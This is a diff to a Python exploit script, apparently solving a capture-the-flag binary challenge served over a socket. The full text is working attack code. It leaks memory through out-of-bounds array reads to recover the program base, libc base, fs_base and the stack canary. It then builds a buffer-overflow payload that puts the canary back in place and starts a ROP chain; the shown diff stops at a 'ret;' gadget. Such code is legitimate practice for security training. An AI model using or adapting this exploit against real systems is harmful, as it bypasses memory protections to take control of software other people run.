@@ -7,7 +7,7 @@ def read(index):
     return int(sock.recvline())
 
 def ofs(addr):
-    return (addr - elf.symbol('array')) // 8
+    return (addr - addr_array) // 8
 
 HOST = os.getenv("HOST", "localhost")
 PORT = int(os.getenv("PORT", "9004"))
@@ -17,18 +17,28 @@ libc = ELF("../distfiles/libc.so.6")
 
 while True:
     libc.base = 0
-    #sock = Process("../distfiles/chall")
+    elf.base = 0
+    #sock = Process("./chall", cwd="../distfiles")
     sock = Socket(HOST, PORT)
 
-    libc.base = read(-11) - libc.symbol('atoll')
-    addr_stack = read(ofs(libc.symbol('environ')))
-    logger.info("stack = " + hex(addr_stack))
-    fs_base = read(ofs(addr_stack - 0x900))
-    logger.info("fs_base = " + hex(fs_base))
-    if fs_base & 0xf != 0:
+    elf.base = read(-5) - elf.symbol('main') - 201
+
+    addr_array = read(-2) - 0x60
+    logger.info("array = " + hex(addr_array))
+
+    libc.base = read(ofs(elf.got('atoll'))) - libc.symbol('atoll')
+    if libc.base & 0xfff != 0:
         logger.error("Bad luck!")
         sock.close()
         continue
+
+    fs_base = read(ofs(addr_array-0x728))
+    logger.info("fs_base = " + hex(fs_base))
+    if fs_base & 0xfff != 0x740:
+        logger.error("Bad luck!")
+        sock.close()
+        continue
+
     canary = read(ofs(fs_base + 0x28))
     logger.info("canary = " + hex(canary))
     if canary & 0xff != 0:
@@ -36,7 +46,8 @@ while True:
         sock.close()
         continue
 
-    payload  = b"A"*0x28
+    payload  = b"12345\0"
+    payload += b"A"*(0x28 - len(payload))
     payload += p64(canary)
     payload += b"A"*8
     payload += p64(next(libc.gadget("ret;")))
